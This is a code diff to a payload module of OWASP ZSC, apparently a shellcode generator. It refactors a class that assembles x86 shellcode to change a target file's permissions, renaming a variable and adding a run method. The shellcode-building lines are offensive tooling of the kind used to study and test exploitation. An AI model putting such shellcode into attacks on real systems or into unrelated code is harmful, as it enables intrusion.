@@ -6,9 +6,8 @@ https://github.com/zscproject/OWASP-ZSC
 http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
 """
-from owasp_zsc.new_cores import stack
+from owasp_zsc.new_cores import base_module, stack, alert
 from math import ceil
-from owasp_zsc.new_cores import base_module
 
 
 class Module(base_module.BasePayload):
@@ -63,7 +62,7 @@ class Module(base_module.BasePayload):
         payload += "push %eax\n"
         payload += "xor %ecx, %ecx\n"
         payload += "push %ecx\n"
-        payload += stack.generate(self.file_dest, "%ecx", "string")
+        payload += stack.generate(self.target_file, "%ecx", "string")
         payload += "xor %ebx, %ebx\n"
         payload += "mov %esp, %ebx\n"
         payload += "xor %ecx, %ecx\n"
@@ -71,7 +70,7 @@ class Module(base_module.BasePayload):
         payload += "push %ecx\n"
         payload += "push %ebx\n"
         payload += "call *%eax\n"
-        payload += f"add ${hex(int(8 + 4 * (ceil(len(self.file_dest) / float(4)))))}, %esp\n"
+        payload += f"add ${hex(int(8 + 4 * (ceil(len(self.target_file) / float(4)))))}, %esp\n"
         payload += "pop %edx\n"
         payload += "pop %ebx\n"
         payload += "xor %ecx, %ecx\n"
@@ -88,3 +87,13 @@ class Module(base_module.BasePayload):
         payload += "call *%eax\n"
 
         return payload
+
+    def run(self):
+        if not self.target_file:
+            alert.error("Target file and file's permissions are required")
+            return
+        try:
+            import traceback
+            self.handle_generate(__name__)
+        except:
+            traceback.print_exc()
